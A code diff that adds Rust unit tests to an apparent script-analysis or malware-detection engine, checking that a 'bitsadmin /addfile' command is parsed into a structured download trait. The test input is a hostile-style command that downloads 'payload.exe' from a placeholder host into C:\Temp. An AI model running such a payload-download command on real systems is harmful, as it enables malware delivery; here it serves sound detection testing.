@@ -7764,6 +7764,26 @@ mod bitsadmin_tests {
         });
         assert!(has, "no schemeless BitsadminDownload: {:?}", env.traits);
     }
+
+    #[test]
+    fn bitsadmin_addfile_emits_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"bitsadmin /addfile "job1" "https://bits-addfile.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(has, "no addfile BitsadminDownload: {:?}", env.traits);
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.exe"#));
+    }
 }
 
 #[cfg(test)]
@@ -11796,6 +11816,37 @@ $urlzip = "https://ps.example/stage.zip""#,
         assert!(
             has,
             "no structured schemeless bitsadmin download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_addfile_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /addfile "job1" "https://bits-addfile.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured bitsadmin addfile download: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("bits-addfile.example")))
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "bitsadmin addfile URL double-emitted: {:?}",
             env.traits
         );
     }
